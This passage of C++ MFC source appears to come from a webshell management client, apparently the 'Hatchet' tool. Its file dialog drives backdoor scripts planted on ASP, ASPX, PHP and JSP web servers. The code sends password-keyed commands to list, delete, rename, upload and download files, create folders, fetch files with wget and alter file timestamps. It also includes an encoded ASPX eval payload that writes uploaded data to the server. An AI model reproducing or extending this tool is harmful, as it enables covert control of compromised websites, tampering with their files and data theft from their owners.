		//调整与父窗口对应
		ScreenToClient(&dlgRect);
		int height = rect.Height();
		rect.top += (dlgRect.top+2);
		rect.left += (dlgRect.left+20);
		rect.bottom = rect.top+height+2;
		rect.right = rect.left+width-20;
		m_SubItemEdit.MoveWindow(&rect);
		m_SubItemEdit.BringWindowToTop();
		m_SubItemEdit.SetWindowText( m_filelist.GetItemText(nSelectList, 0) );
		m_SubItemEdit.SetSel(0,-1);
		m_SubItemEdit.ShowWindow(SW_SHOW);
		m_SubItemEdit.SetFocus();
	}
	return;
}
void CFileDlg::OnFileChangeTime()								//更改时间
{
	if(nSelectList != -1)
	{
		bOnFileChangeTime = true;					//失去焦点,判断要不要
		CRect rect,dlgRect;
		/*
		获得当前列的宽度以适应如果用户调整宽度
		此处不用获得的子项rect矩形框来设置宽度
		是因第一列时返回的宽度是整行的宽度，我也不知道为啥
		*/
		int width = m_filelist.GetColumnWidth(1);
		m_filelist.GetSubItemRect(nSelectList, 1, LVIR_BOUNDS,rect);

		//获得listctrl矩形框
		//获得父对话框的位置以调整CEdit的显示位置，具体见下面代码
		m_filelist.GetWindowRect(&dlgRect);
		//调整与父窗口对应
		ScreenToClient(&dlgRect);
		int height = rect.Height();
		rect.top += (dlgRect.top+2);
		rect.left += (dlgRect.left+7);
		rect.bottom = rect.top+height+2;
		rect.right = rect.left+width-7;
		m_SubItemEdit.MoveWindow(&rect);
		m_SubItemEdit.BringWindowToTop();
		m_SubItemEdit.SetWindowText( m_filelist.GetItemText(nSelectList, 1) );
		m_SubItemEdit.SetSel(0,-1);
		m_SubItemEdit.ShowWindow(SW_SHOW);
		m_SubItemEdit.SetFocus();
	}
	return;
}
void CFileDlg::OnFileNewDirectory()								//新建目录
{
	bOnFileNewDirectory = true;					//失去焦点,判断要不要

	int m_i = m_filelist.GetItemCount();
	m_filelist.InsertItem(m_i, "New Folder",0);
	m_filelist.EnsureVisible(m_i, FALSE);

	CString szOnFileNewDirectory;
	CTime tm = CTime::GetCurrentTime();
	szOnFileNewDirectory = tm.Format("%Y-%m-%d %X");

	m_filelist.SetItemText(m_i, 1, szOnFileNewDirectory);
	m_filelist.SetItemText(m_i, 2, "0");
	m_filelist.SetItemText(m_i, 3, "32");

	CRect rect,dlgRect;
	/*
	获得当前列的宽度以适应如果用户调整宽度
	此处不用获得的子项rect矩形框来设置宽度
	是因第一列时返回的宽度是整行的宽度，我也不知道为啥
	*/
	int width = m_filelist.GetColumnWidth(0);
	m_filelist.GetSubItemRect(m_i, 0, LVIR_BOUNDS,rect);
	
	//获得listctrl矩形框
	//获得父对话框的位置以调整CEdit的显示位置，具体见下面代码
	m_filelist.GetWindowRect(&dlgRect);
	//调整与父窗口对应
	ScreenToClient(&dlgRect);
	int height = rect.Height();
	rect.top += (dlgRect.top+2);
	rect.left += (dlgRect.left+20);
	rect.bottom = rect.top+height+2;
	rect.right = rect.left+width-20;
	m_SubItemEdit.MoveWindow(&rect);
	m_SubItemEdit.BringWindowToTop();
	m_SubItemEdit.SetWindowText( m_filelist.GetItemText(m_i, 0) );
	m_SubItemEdit.SetSel(0,-1);
	m_SubItemEdit.ShowWindow(SW_SHOW);
	m_SubItemEdit.SetFocus();
}

int CALLBACK listCompare(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
{
	DATA* pListCtrl = (DATA*)lParamSort;
	int col = pListCtrl->subitem;//点击的列项传递给col，用来判断点击了第几列
	if (col == 2)					//int型比较
	{
		//得到该列的前2项
		CString strItem1 = (pListCtrl->plist)->GetItemText((int)lParam1, col);
		CString strItem2 = (pListCtrl->plist)->GetItemText((int)lParam2, col);
		//比较两个数
		LPCTSTR s1=(LPCTSTR)strItem1;
		LPCTSTR s2=(LPCTSTR)strItem2;
		//将字符串转为int型比较
		int n1=atoi((_bstr_t)s1);
		int n2=atoi((_bstr_t)s2);
		if(fav)//fav是用来判断是升序还是降序排列的函数
		{
			//比较两个数 如果返回-1表示n1排在n2前面，如果返回1表示n1排在n2后面，如果相等返回0，这里没有判断相等的情况
			if (n1<n2)
				return -1;
			else
				return 1;
		}else{
			if (n1<n2)
				return 1;
			else
				return -1;
		}
	}else{		//字符串比较，即相同或类似的字符串会被排放到一起
		CString strItem1 =  (pListCtrl->plist)->GetItemText((int)lParam1, col);
		CString strItem2 =  (pListCtrl->plist)->GetItemText((int)lParam2, col);
		
		if (fav)
		{
			return _tcsicmp(strItem1.GetBuffer(MAX_PATH),strItem2.GetBuffer(MAX_PATH));
		}else{
			return _tcsicmp(strItem2.GetBuffer(MAX_PATH),strItem1.GetBuffer(MAX_PATH));
		}
	}
	return 0;
}

void CFileDlg::OnLvnColumnclickList1(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	
	for(int i = 0; i < m_filelist.GetItemCount(); ++i) //这个for用来给表中的项添加上索引号
	{
		m_filelist.SetItemData(i,i);
	}
	
	DATA data;
	data.subitem = pNMLV->iSubItem;
	data.plist = &m_filelist;
	fav = !fav;
	m_filelist.SortItems(listCompare,(LPARAM)&data);
	
	*pResult = 0;
}

BOOL CFileDlg::PreTranslateMessage(MSG* pMsg)
{
	if(pMsg -> message == WM_KEYDOWN)
	{
		if(pMsg -> wParam == VK_BACK)		//退格，返回上一层
		{
			if ( (GetFocus()->GetParent()) != GetDlgItem(IDC_COMBO_FILEPATH) && GetDlgItem(IDC_EDIT_FILE_SUBITEM) != GetFocus() )
			{
				OnBnClickedUpperstory();
				return TRUE;
			}
		}

		if(pMsg -> wParam == VK_F5)			//按了 F5，刷新
		{
			OnFileRefresh();				//刷新
			return TRUE;
		}

		if ( GetDlgItem(IDC_FILE_LIST) == GetFocus() )//焦点在文件列表框里
		{
			if(pMsg -> wParam == VK_F2)	//按了 F2，重命名
			{
				nSelectList = m_filelist.GetNextItem(-1,LVNI_SELECTED);
				OnFileRename();		//重命名
				return TRUE;
			}
			if(pMsg -> wParam == VK_DELETE)//按了 DELETE，多选，删除文件
			{
				OnFileDeleteFiles();					//多选，删除文件
				return TRUE;
			}
			if ((pMsg->wParam == 'C' || pMsg->wParam == 'c') && ::GetKeyState(VK_CONTROL)&0x8000)
			{
				OnFileCopy();															//文件复制
				return TRUE;
			}

			if ((pMsg->wParam == 'X' || pMsg->wParam == 'x') && ::GetKeyState(VK_CONTROL)&0x8000)
			{
				OnFileCut();															//文件剪切
				return TRUE;
			}
			if ((pMsg->wParam == 'V' || pMsg->wParam == 'v') && ::GetKeyState(VK_CONTROL)&0x8000)
			{
				OnFilePaste();															//文件粘贴
				return TRUE;
			}
		}


		if ( GetDlgItem(IDC_EDIT_FILE_SUBITEM) != GetFocus() )
		{
			if(pMsg -> wParam == VK_ESCAPE)
				return TRUE;
			if(pMsg -> wParam == VK_RETURN)
			{
				if ( (GetFocus()->GetParent()) == GetDlgItem(IDC_COMBO_FILEPATH) )			//回车读取EDIT内容的目录文件
				{
					OnBnClickedReadfiles();
					return TRUE;
				}else if ( GetDlgItem(IDC_FILE_LIST) == GetFocus() )	//回车进入列表框
				{
					//////////////////////////////////////////////////////////////////////////
					CString temp;
					int nList = m_filelist.GetNextItem(-1,LVNI_SELECTED);
					if (nList < 0)
					{
						m_filelist.SetFocus();
						return TRUE;//修正获取列表框数据的小问题。
					}

					if (!bThreadFinish)
					{
						m_edit.SetWindowText( "GetFiles Threads busy" );					//设置状态栏
						m_filelist.SetFocus();
						return TRUE;
					}

					GetDlgItemText(IDC_COMBO_FILEPATH, temp);

					LV_ITEM lvitem = {0};
					lvitem.iItem = nList;
					lvitem.iSubItem = 0;
					lvitem.mask = LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM;				//根据图标判断文件类型
					m_filelist.GetItem(&lvitem);

					if (lvitem.iImage== 0)				// 是文件夹
					{
						if (IsWin)
						{
							GetFiles_szPath = temp + m_filelist.GetItemText(nList,0) + "\\";
							GetFiles_bNoDB = false;//默认 false
							bThreadFinish = false;
							CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

							//GetFiles(temp + m_filelist.GetItemText(nList,0) + "\\");
						}else{
							GetFiles_szPath = temp + m_filelist.GetItemText(nList,0) + "/";
							GetFiles_bNoDB = false;//默认 false
							bThreadFinish = false;
							CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

							//GetFiles(temp + m_filelist.GetItemText(nList,0) + "/");
						}
					}else{																		// 是文件，编辑文件
						CString szCommonFileType = ".jpg.gif.png.bmp.jpeg.ico.zip.rar.tgz.7z.tar.gz.iso.cab.bz2.jar.dmg.exe.msi.dll.sys.avi.mpeg.mpg.vob.rmvb.wmv.mp3.mp4.3gp.ogg.voc"
							".swf.pdf.flv.fla.psd.doc.docx.xls.xlsx.ppt.pptx.mdb.rtf.";
						CString szFilesTypeName = m_filelist.GetItemText(nList,0);
						szFilesTypeName = szFilesTypeName.Right( rfind(szFilesTypeName, ".") );

						if (szFilesTypeName == "" || szCommonFileType.Find(szFilesTypeName + ".") == -1)
						{
							//AfxMessageBox("文件编辑: "+ temp+ m_filelist.GetItemText(nList,0));
							CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
							szGlobal_SiteUrl = szSiteUrl;
							szGlobal_SitePass = szSitePass;
							nGlobal_SiteScript = nSiteScript;
							nGlobal_SiteCode = nSiteCode;
							szGlobal_SiteFileSave = temp + m_filelist.GetItemText(nList,0);
							pMainHatchet->AddFileSaveTab();

							return CDialog::PreTranslateMessage(pMsg);
						}else{
							//	弹出 下载
							OnFileDownloadFile();											//下载文件
						}
					}
					m_filelist.SetFocus();

					return TRUE;
					//////////////////////////////////////////////////////////////////////////
				}else{
					return TRUE;
				}
			}
		}else{
			if(pMsg -> wParam == VK_ESCAPE)		//取消
			{
				bOnFileRename = false;
				bOnFileChangeTime = false;
				if (bOnFileNewDirectory)
				{
					int m_i = m_filelist.GetItemCount();
					m_filelist.DeleteItem(m_i-1);		//ESC 就不要了
				}
				bOnFileNewDirectory = false;

				m_SubItemEdit.ShowWindow(SW_HIDE);
				m_filelist.SetFocus();
				return TRUE;
			}
			if(pMsg -> wParam == VK_RETURN)		//确认
			{
				m_SubItemEdit.ShowWindow(SW_HIDE);
				m_filelist.SetFocus();
				return TRUE;
			}
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CFileDlg::OnFileDeleteFiles()										//多选，删除文件
{
	CString temp;
	POSITION pos = m_filelist.GetFirstSelectedItemPosition();
	CStringArray	szDeleteFilesArr;
	CString			szDFTemp;
	szDeleteFilesArr.RemoveAll();
	if (!pos)
	{
		return;
	}
	while (pos)
	{
		szDFTemp.Format("%d", m_filelist.GetNextSelectedItem(pos));
		//AfxMessageBox( szDeleteFiles );
		szDeleteFilesArr.Add(szDFTemp);
		
		//szDeleteFilesArr.Add( m_filelist.GetNextSelectedItem(pos) );
	}
	CString szOnFileDeleteFiles = "\t";
	
	for (int j=0; j < szDeleteFilesArr.GetSize(); j++)
	{
		szOnFileDeleteFiles += m_filelist.GetItemText( atoi(szDeleteFilesArr.GetAt(j)), 0) + "\r\n\t";
	}
	
	if ( MessageBox( szOnFileDeleteFiles.Left(szOnFileDeleteFiles.GetLength()-3), "Whether to delete these files ?", MB_OKCANCEL) != IDOK)			//询问删除
	{
		m_filelist.SetFocus();
		return;
	}
	
	//////////////////////////////////////////////////////////////////////////
	GetDlgItemText(IDC_COMBO_FILEPATH, szOnFileDeleteFiles);
	szOnFileDeleteFiles.Replace("\\", "\\\\");
	
	CString szDFSendCode = "";
	if (nSiteScript == 1)								//	ASP
	{
		szDFSendCode = szSitePass + szFileDelete[0];
	}
	else if (nSiteScript == 2)							//  ASPX
	{
		szDFTemp.Format("%d", nSiteCode);
		szDFSendCode = szSitePass + szFileDelete[1];
		szDFSendCode.Replace("%nPageCode%", szDFTemp);
	}
	else if(nSiteScript == 3)							//  PHP
	{
		szDFSendCode = szSitePass + szFileDelete[2];
	}
	else if (nSiteScript == 4)							//  JSP
	{
		szDFSendCode = szSitePass +"=E&z0="+ szSiteCode +"&z1=";
	}else{
		return;
	}
	
	for (int i=(int)szDeleteFilesArr.GetCount(); i > 0; i--)
	{
		m_edit.SetWindowText( "DeleteFile: "+ m_filelist.GetItemText( atoi(szDeleteFilesArr.GetAt(i-1)), 0));					//设置状态栏
		bHttpIsOK = MyHttp(szSiteUrl, szDFSendCode + UrlEnCode(nSiteCode, szOnFileDeleteFiles + m_filelist.GetItemText( atoi(szDeleteFilesArr.GetAt(i-1)), 0)), nSiteCode, temp, szError);
		if (bHttpIsOK && temp == "1")
		{
			m_edit.SetWindowText( "DeleteFiles: "+ m_filelist.GetItemText( atoi(szDeleteFilesArr.GetAt(i-1)), 0) +" completed");					//设置状态栏
			m_filelist.DeleteItem( atoi(szDeleteFilesArr.GetAt(i-1)) );
		}else{
			m_edit.SetWindowText( "DeleteFiles: "+ m_filelist.GetItemText( atoi(szDeleteFilesArr.GetAt(i-1)), 0) +" fail");					//设置状态栏
		}
	}
	m_filelist.SetFocus();
	return;
}

void CFileDlg::OnKillFocusSubItemEdit()									//失去焦点
{
	CString temp;
	CString szKillFocusFileTemp, temp1;
	GetDlgItemText(IDC_COMBO_FILEPATH, szKillFocusFileTemp);
	szKillFocusFileTemp.Replace("\\", "\\\\");

	m_SubItemEdit.ShowWindow(SW_HIDE);
	CString szOnKillFocusSubItemEdit;
	GetDlgItemText(IDC_EDIT_FILE_SUBITEM, szOnKillFocusSubItemEdit);

	CString szOldFilePath = "";


	if (bOnFileRename)																	//重命名
	{
		if (m_filelist.GetItemText(nSelectList, 0) == szOnKillFocusSubItemEdit)//跟原来一样，不需要进数据库更新
		{
			bOnFileRename = false;
			bOnFileChangeTime = false;
			bOnFileNewDirectory = false;
			return;
		}
		//////////////////////////////////////////////////////////////////////////
		bool bFileExist = false;	//文件是否存在
		for(int i = 0; i < m_filelist.GetItemCount(); ++i)
		{
			if (IsWin)
			{
				if (_stricmp(szOnKillFocusSubItemEdit, m_filelist.GetItemText(i, 0)) == 0)
				{
					bFileExist = true;
					break;
				}
			}else{
				if (strcmp(szOnKillFocusSubItemEdit, m_filelist.GetItemText(i, 0)) == 0)
				{
					bFileExist = true;
					break;
				}
			}
		}
		if ( bFileExist )
		{
			m_edit.SetWindowText( "This file already exists.");					//设置状态栏
			bOnFileRename = false;
			bOnFileChangeTime = false;
			bOnFileNewDirectory = false;
			return;
		}
		//////////////////////////////////////////////////////////////////////////
		szOldFilePath = UrlEnCode(nSiteCode,  szKillFocusFileTemp + m_filelist.GetItemText(nSelectList, 0) );			//旧的
		CString szNewFilePath = UrlEnCode(nSiteCode,  szKillFocusFileTemp + szOnKillFocusSubItemEdit );				//新的

		if (nSiteScript == 1)								//	ASP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileReName[0] + szOldFilePath +"&z2="+ szNewFilePath , nSiteCode, temp, szError);
		}
		else if (nSiteScript == 2)							//  ASPX
		{
			szKillFocusFileTemp.Format("%d", nSiteCode);
			temp1 = szFileReName[1];
			temp1.Replace("%nPageCode%", szKillFocusFileTemp);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp1 + szOldFilePath +"&z2="+ szNewFilePath , nSiteCode, temp, szError);
		}
		else if(nSiteScript == 3)							//  PHP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileReName[2] + szOldFilePath +"&z2="+ szNewFilePath , nSiteCode, temp, szError);
		}
		else if (nSiteScript == 4)							//  JSP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass +"=I&z0="+ szSiteCode +"&z1="+ szOldFilePath +"&z2="+ szNewFilePath, nSiteCode, temp, szError);
		}
		if (bHttpIsOK && temp == "1")
		{
			m_edit.SetWindowText( "Rename completed");					//设置状态栏
			m_filelist.SetItemText(nSelectList, 0, szOnKillFocusSubItemEdit);
		}else{
			m_edit.SetWindowText( "Rename fail,"+ temp);					//设置状态栏
		}
	}
	if (bOnFileChangeTime)																//更改时间
	{
		if (m_filelist.GetItemText(nSelectList, 1) == szOnKillFocusSubItemEdit)//跟原来一样，不需要进数据库更新
		{
			bOnFileRename = false;
			bOnFileChangeTime = false;
			bOnFileNewDirectory = false;
			return;
		}
		szOldFilePath = UrlEnCode(nSiteCode,  szKillFocusFileTemp + m_filelist.GetItemText(nSelectList, 0) );			//要修改时间的文件名
		CString szFileNewTime = UrlEnCode(nSiteCode, szOnKillFocusSubItemEdit);										//修改时间
		if (nSiteScript == 2)							//  ASPX 需要修改编码
		{
			szKillFocusFileTemp.Format("%d", nSiteCode);
			temp1 = szFileChangeTime[1];
			temp1.Replace("%nPageCode%", szKillFocusFileTemp);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp1 + szOldFilePath +"&z2="+ szFileNewTime , nSiteCode, temp, szError);
		}else if(nSiteScript == 4)						// JSP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass +"=K&z0="+ szSiteCode +"&z1="+ szOldFilePath +"&z2="+ szFileNewTime, nSiteCode, temp, szError);
		}else{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileChangeTime[nSiteScript-1] + szOldFilePath +"&z2="+ szFileNewTime , nSiteCode, temp, szError);
		}
		if (bHttpIsOK && temp == "1")		//返回成功
		{
			m_edit.SetWindowText( "ChangeTime completed");					//设置状态栏
			m_filelist.SetItemText(nSelectList, 1, szOnKillFocusSubItemEdit);
		}else{
			m_edit.SetWindowText( "ChangeTime fail,"+ temp);					//设置状态栏
		}
	}
	if (bOnFileNewDirectory)
	{
		int m_i = m_filelist.GetItemCount();
		//////////////////////////////////////////////////////////////////////////
		bool bFileExist = false;	//文件是否存在
		for(int i = 0; i < m_filelist.GetItemCount(); ++i)
		{
			if (IsWin)
			{
				if (_stricmp(szOnKillFocusSubItemEdit, m_filelist.GetItemText(i, 0)) == 0)
				{
					bFileExist = true;
					break;
				}
			}else{
				if (strcmp(szOnKillFocusSubItemEdit, m_filelist.GetItemText(i, 0)) == 0)
				{
					bFileExist = true;
					break;
				}
			}
		}
		if ( bFileExist )
		{
			m_edit.SetWindowText( "This file already exists.");					//设置状态栏
			m_filelist.DeleteItem(m_i-1);										//新建不成功,删除记录
			bOnFileRename = false;
			bOnFileChangeTime = false;
			bOnFileNewDirectory = false;
			return;
		}
		//////////////////////////////////////////////////////////////////////////
		if (szOnKillFocusSubItemEdit != "" && szOnKillFocusSubItemEdit != "New Folder")	//新建目录
		{
			m_filelist.SetItemText(m_i-1, 0, szOnKillFocusSubItemEdit);
			CString szKillFocusFileNewDir = UrlEnCode(nSiteCode, szKillFocusFileTemp + szOnKillFocusSubItemEdit);	//新建的文件夹名称
			if (nSiteScript == 2)					//ASPX
			{
				szKillFocusFileTemp.Format("%d", nSiteCode);
				temp1 = szFileNewDir[1];
				temp1.Replace("%nPageCode%", szKillFocusFileTemp);
				bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp1 + szKillFocusFileNewDir , nSiteCode, temp, szError);
			}
			else if(nSiteScript == 4)				//JSP
			{
				bHttpIsOK = MyHttp(szSiteUrl, szSitePass +"=J&z0="+ szSiteCode +"&z1="+ szKillFocusFileNewDir, nSiteCode, temp, szError);
			}else{
				bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileNewDir[nSiteScript-1] + szKillFocusFileNewDir , nSiteCode, temp, szError);
			}
			if (bHttpIsOK && temp == "1")
			{
				m_edit.SetWindowText( "Create a new directory to complete");					//设置状态栏
			}else{											//新建失败
				m_filelist.DeleteItem(m_i-1);
				m_edit.SetWindowText( "Create a new directory failed");					//设置状态栏
			}
		}else{																			//新建不成功,删除记录
			m_filelist.DeleteItem(m_i-1);
		}
	}

	bOnFileRename = false;
	bOnFileChangeTime = false;
	bOnFileNewDirectory = false;
}


void CFileDlg::OnFileWget()													//Wget
{
	CWgetDlg * pWget = new CWgetDlg;
	if (pWget)
	{
		szGlobal_SiteUrl = szSiteUrl;
		szGlobal_SitePass = szSitePass;
		nGlobal_SiteScript = nSiteScript;
		nGlobal_SiteCode = nSiteCode;

		CString szOnFileWget;
		GetDlgItemText(IDC_COMBO_FILEPATH, szOnFileWget);
		CPoint pt;
		GetCursorPos(&pt);
		pWget->szWgetPath = szOnFileWget;
		pWget->Create(CWgetDlg::IDD,this);
		pWget->ShowWindow(SW_SHOW);
		pWget->SetWindowPos(NULL, pt.x-100, pt.y-50, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
	}
}

DWORD WINAPI FunUploadFile(LPVOID lpParameter)						//上传文件
{
	FunFileInfo* pInfo = (FunFileInfo*)lpParameter;

	CString szSiteUrl_pInfo = pInfo->szSiteUrl;
	CString szSitePass_pInfo = pInfo->szSitePass;
	int nSiteCode_pInfo = pInfo->nSiteCode;
	int nSiteScript_pInfo = pInfo->nSiteScript;
	CString szSavePath_pInfo = pInfo->szS1;
	CString szLocalPath_pInfo = pInfo->szS2;

	m_edit.SetWindowText( "Uploading: "+ szLocalPath_pInfo );					//设置状态栏

	CString temp;
	WIN32_FIND_DATA fd;
	HANDLE hFind = ::FindFirstFile(szLocalPath_pInfo,&fd);
	//不存在同名的文件或文件夹
	if (hFind == INVALID_HANDLE_VALUE)
	{
		return false;
	}
	else if (fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)//判断是否为目录
	{
		m_edit.SetWindowText( "This is the folder, Software is improving!" );					//设置状态栏
		return 0;
	}
	else//判断为文件
	{
	}
	::FindClose(hFind);

	CString szUrlEnFile = UrlEnFile(szLocalPath_pInfo);
	CString UPTemp;
	if (nSiteScript_pInfo == 1)								//	ASP
	{
		szSavePath_pInfo = UrlEnCode(nSiteCode_pInfo, szSavePath_pInfo, false, true);
		for (int sizei=0; sizei<=szUrlEnFile.GetLength(); sizei+=51200)
		{
			CString szUrlEnFile_Send = szUrlEnFile.Mid(sizei, 51200);
			if (sizei == 0)
			{
				bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szFileUpload[0] + szSavePath_pInfo +"&z2="+ szUrlEnFile_Send +"&z3=0", nSiteCode_pInfo, temp, szError);
			}else{
				bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szFileUpload[0] + szSavePath_pInfo +"&z2="+ szUrlEnFile_Send +"&z3=1", nSiteCode_pInfo, temp, szError);
			}
		}
		//&z3=0"//z3 = 1，追加文本
	}
	else if (nSiteScript_pInfo == 2)							//  ASPX
	{
		UPTemp.Format("%d", nSiteCode_pInfo);
		szSavePath_pInfo = MyBase64Encode(nSiteCode_pInfo, szSavePath_pInfo);
		szSavePath_pInfo = szFileUpload[1] + szSavePath_pInfo;
		szSavePath_pInfo.Replace("%nPageCode%", UPTemp);		//替换里边的编码

		CString szBase64EvalCode = "var P:String=System.Text.Encoding.GetEncoding("+ UPTemp +").GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]));"
			"var Z:String=Request.Item[\"z2\"];var B:byte[]=new byte[Z.Length/2];for(var i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}"
			"if(Int32.Parse(Request.Item[\"z3\"])>0)"
			"{var fs:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Append);fs.Seek(0,System.IO.SeekOrigin.End);fs.Write(B,0,B.Length);fs.Close();"
			"}else{var fs2:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Create);fs2.Write(B,0,B.Length);fs2.Close();}"
			"Response.Write(\"1\");";
		szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
		szSavePath_pInfo.Replace("%szBase64EvalCode%", szBase64EvalCode);

		for (int sizei=0; sizei<=szUrlEnFile.GetLength(); sizei+=51200)
		{
			CString szUrlEnFile_Send = szUrlEnFile.Mid(sizei, 51200);
			if (sizei == 0)
			{
				bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szSavePath_pInfo + "&z2="+ szUrlEnFile_Send +"&z3=0", nSiteCode_pInfo, temp, szError);
			}else{
				bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szSavePath_pInfo + "&z2="+ szUrlEnFile_Send +"&z3=1", nSiteCode_pInfo, temp, szError);
			}
		}
	}
	else if(nSiteScript_pInfo == 3)							//  PHP
	{
		szSavePath_pInfo = MyBase64Encode(nSiteCode_pInfo, szSavePath_pInfo);
		for (int sizei=0; sizei<=szUrlEnFile.GetLength(); sizei+=51200)
		{
			CString szUrlEnFile_Send = szUrlEnFile.Mid(sizei, 51200);
			if (sizei == 0)
			{
				bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szFileUpload[2] + szSavePath_pInfo +"&z2="+ szUrlEnFile_Send +"&z3=w", nSiteCode_pInfo, temp, szError);
			}else{
				bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szFileUpload[2] + szSavePath_pInfo +"&z2="+ szUrlEnFile_Send +"&z3=a", nSiteCode_pInfo, temp, szError);
			}
		}
	}
	else if (nSiteScript_pInfo == 4)							//  JSP
	{
		CString szSiteCode = "";
		if (nSiteCode_pInfo == 65001)
		{
			szSiteCode = "UTF-8";
		}
		else if (nSiteCode_pInfo == 936)
		{
			szSiteCode = "GB2312";
		}
		else if (nSiteCode_pInfo == 950)
		{
			szSiteCode = "BIG5";
		}

		szSavePath_pInfo = UrlEnCode(nSiteCode_pInfo, szSavePath_pInfo);
		bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + "=G&z0="+ szSiteCode +"&z1="+ szSavePath_pInfo +"&z2="+ szUrlEnFile, nSiteCode_pInfo, temp, szError);
	}
	if (bHttpIsOK && temp == "1")//上传成功
	{
		delete pInfo;
		m_edit.SetWindowText( "Upload complete: "+ szLocalPath_pInfo );					//设置状态栏
		pInfo->pHwnd->OnFileRefresh();													//刷新
		return 1;
	}

	delete pInfo;
	m_edit.SetWindowText( "Upload Failed: "+ szLocalPath_pInfo );					//设置状态栏
	return 0;
}

void CFileDlg::OnFileUploadFile()														//右键，上传文件
{
	CFileDialog dlg(TRUE, NULL, NULL, OFN_ALLOWMULTISELECT, _T("All files(*.*)|*.*||"));
	DWORD MAXFILE = 2000 * 256;
	dlg.m_ofn.nMaxFile = MAXFILE;
	char* pMaxFile = new char[MAXFILE];
	dlg.m_ofn.lpstrFile = pMaxFile;
	dlg.m_ofn.lpstrFile[0] = NULL;
	dlg.m_ofn.lpstrTitle = _T("Select one or more files uploaded to the server");//对话框标题
	
	if(dlg.DoModal() == IDOK)
	{
		CString szOnDropFilePath,	//文件全路劲名
			szOnDropFile;			//文件名
		bool bFileExist = false;	//文件是否存在

		int nCount = 0;
		POSITION pos = dlg.GetStartPosition();
		while (pos != NULL)
		{
			bFileExist = false;
			szOnDropFilePath = dlg.GetNextPathName(pos);
			szOnDropFile = szOnDropFilePath.Right( rfind(szOnDropFilePath, "\\")-1 ); //取得文件名

			for(int i = 0; i < m_filelist.GetItemCount(); ++i)
			{
				if (IsWin)
				{
					if (_stricmp(szOnDropFile, m_filelist.GetItemText(i, 0)) == 0)
					{
						bFileExist = true;
						break;
					}
				}else{
					if (strcmp(szOnDropFile, m_filelist.GetItemText(i, 0)) == 0)
					{
						bFileExist = true;
						break;
					}
				}
			}
			CString szEditPath;
			GetDlgItemText(IDC_COMBO_FILEPATH, szEditPath);
			//szEditPath.Replace("\\","\\\\");		//取得远程的路劲	2015.01.20 IPC BUG
			szEditPath = szEditPath + szOnDropFile;		//路劲加上文件名

			FunFileInfo *pInfo;
			pInfo = new FunFileInfo;
			pInfo->szSiteUrl = szSiteUrl;
			pInfo->szSitePass = szSitePass;
			pInfo->nSiteCode = nSiteCode;
			pInfo->nSiteScript = nSiteScript;
			pInfo->szS1 = szEditPath;
			pInfo->szS2 = szOnDropFilePath;
			pInfo->pHwnd = this;
			Sleep(100);

			if (!bFileExist)
			{
				//bUpOK = FunUploadFile(szEditPath, szOnDropFilePath);
				CreateThread(NULL, 0, FunUploadFile, pInfo, 0, 0);
			}else{
				if (MessageBox(szOnDropFile + " This file already exists. Replace existing file? ", "", MB_OKCANCEL) == IDOK)
				{
					//bUpOK = FunUploadFile(szEditPath, szOnDropFilePath);
					CreateThread(NULL, 0, FunUploadFile, pInfo, 0, 0);
				}else{
					delete pInfo;
				}
			}
			nCount++;
		}
		//OnBnClickedReadfiles();	//上传完成，刷新列表
	}
	delete[] pMaxFile;
}

DWORD WINAPI FunDownloadFile(LPVOID lpParameter)											//下载文件
{
	FunFileInfo* pInfo = (FunFileInfo*)lpParameter;

	CString szSiteUrl_pInfo = pInfo->szSiteUrl;
	CString szSitePass_pInfo = pInfo->szSitePass;
	int nSiteCode_pInfo = pInfo->nSiteCode;
	int nSiteScript_pInfo = pInfo->nSiteScript;
	CString szSavePath_pInfo = pInfo->szS1;
	CString szRemotePath_pInfo = pInfo->szS2;

	CString sz_edit;
	sz_edit = szRemotePath_pInfo;
	sz_edit.Replace("\\\\", "\\");//好看一点而已
	m_edit.SetWindowText( "Downloading: "+ sz_edit );					//设置状态栏

	CString aaa,szHost,szPort,szPath;
	bool bIsSSL = UrlExplode(szSiteUrl_pInfo, szHost, szPort, szPath);
	
	bool bDownLoad;
	szRemotePath_pInfo = UrlEnCode(nSiteCode_pInfo, szRemotePath_pInfo);
	if (nSiteScript_pInfo == 1)								//	ASP
	{
		bDownLoad = HttpDown_GP(bIsSSL, "POST", szHost, szPath, szSitePass_pInfo + szFileDownFile[0] + szRemotePath_pInfo, "", atoi(szPort), true, szSavePath_pInfo, aaa);
	}
	else if (nSiteScript_pInfo == 2)							//  ASPX
	{
		aaa.Format("%d", nSiteCode_pInfo);
		szRemotePath_pInfo = szFileDownFile[1] + szRemotePath_pInfo;
